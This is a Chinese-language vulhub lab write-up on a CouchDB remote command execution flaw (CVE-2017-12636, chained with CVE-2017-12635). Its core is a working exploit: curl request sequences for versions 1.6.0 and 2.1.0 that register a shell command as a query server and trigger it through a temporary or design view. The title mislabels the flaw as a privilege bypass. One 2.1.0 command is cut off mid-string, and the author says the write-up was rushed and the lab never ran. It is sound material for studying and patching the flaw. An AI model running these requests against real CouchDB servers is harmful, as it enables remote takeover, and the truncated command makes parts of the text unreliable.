# Couchdb 垂直权限绕过漏洞

###### by ADummy

### 0x00利用路线

​			Burpsuite抓包改包--->用户创建成功--->成功登录

### 0x01漏洞介绍

CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 `RESTful JavaScript Object Notation (JSON) API` 访问。CouchDB会默认会在5984端口开放Restful的API接口，用于数据库的管理功能。

那么，问题出在哪呢？翻阅官方描述会发现，CouchDB中有一个`Query_Server`的配置项，在官方文档中是这么描述的：

> CouchDB delegates computation of design documents functions to external query servers. The external query server is a special OS process which communicates with CouchDB over standard input/output using a very simple line-based protocol with JSON messages.

直白点说，就是CouchDB允许用户指定一个二进制程序或者脚本，与CouchDB进行数据交互和处理，`query_server`在配置文件local.ini中的格式：

```
[query_servers]
LANGUAGE = PATH ARGS
```

默认情况下，配置文件中已经设置了两个query_servers:

```
[query_servers]
javascript = /usr/bin/couchjs /usr/share/couchdb/server/main.js
coffeescript = /usr/bin/couchjs /usr/share/couchdb/server/main-coffee.js
```

可以看到，CouchDB在`query_server`中引入了外部的二进制程序来执行命令，如果我们可以更改这个配置，那么就可以利用数据库来执行命令了，但是这个配置是在local.ini文件中的，如何控制呢？

继续读官方的文档，发现了一个有意思的功能，CouchDB提供了一个API接口用来更改自身的配置，并把修改后的结果保存到配置文件中：

> The CouchDB Server Configuration API provide an interface to query and update the various configuration values within a running CouchDB instance

也就是说，除了`local.ini`的配置文件，CouchDB允许通过自身提供的`Restful API`接口动态修改配置属性。结合以上两点，我们可以通过一个未授权访问的CouchDB，通过修改其`query_server`配置，来执行系统命令			

```
CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。可以被利用于，非管理员用户赋予自身管理员身份权限。

CVE-2017-12636时由于数据库自身设计原因，管理员身份可以通过HTTP（S）方式，配置数据库。在某些配置中，可设置可执行文件的路径，在数据库运行范围内执行。结合CVE-2017-12635可实现远程代码执行
```

​			Couchdb 2.x和和1.x的API接口有一定区别，所以这个漏洞的利用方式也不同。本环境启动的是1.6.0版本，如果你想测试2.1.0版本，可以启动[CVE-2017-12635](https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635)附带的环境

##### 影响版本

```
<1.7.0 && <2.1.1
```

### 0x02漏洞复现

​			该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用 [CVE-2017-12635](https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635)先增加一个管理员用户。

##### **PAYLOAD1:

### 1.6.0 下的说明

依次执行如下请求即可触发任意命令执行：

```
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd' -d '"id >/tmp/success"'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
curl -X POST 'http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'
```

其中,`vulhub:vulhub`为管理员账号密码。

第一个请求是添加一个名字为`cmd`的`query_servers`，其值为`"id >/tmp/success"`，这就是我们后面待执行的命令。

第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。

第四个请求就是在这个Database里进行查询，因为我将language设置为`cmd`，这里就会用到我第一步里添加的名为`cmd`的`query_servers`，最后触发命令执行。

##### **PAYLOAD2:

### 2.1.0 下的说明

2.1.0中修改了我上面用到的两个API，这里需要详细说明一下。

Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问`/_membership`即可：

```
curl http://vulhub:vulhub@your-ip:5984/_membership
```

可见，我们这里只有一个node，名字是`nonode@nohost`。

然后，我们修改`nonode@nohost`的配置：

```
curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '"id >/
```

然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document：

```
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
```

Couchdb 2.x删除了`_temp_view`，所以我们为了触发`query_servers`中定义的命令，需要添加一个`_view`：

```
curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}' -H "Content-Type: application/json"
```

增加`_view`的同时即触发了`query_servers`中的命令。		

![Couchdb_任意命令执行漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Couchdb_任意命令执行漏洞_1.jpg)

![Couchdb_任意命令执行漏洞_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Couchdb_任意命令执行漏洞_2.jpg)

###  总结:完成的很草率，环境总搭建不起来，心态炸裂。以后回来补已经备注。

### 0x03修复方案

1.打补丁,升级到最新版本

2.使用ECS安全组或防火墙策略，限制CouchDB端口暴露在互联网，设置精细化网络访问控制。

3.开启认证功能，不要使用默认账号口令，配置自定义账号和强口令，防止暴力破解攻击事件。

### 0x04参考资料

https://vulhub.org/#/environments/couchdb/CVE-2017-12636/

https://www.secpulse.com/archives/45917.html

https://www.cnblogs.com/huangxiaosan/p/14317324.html



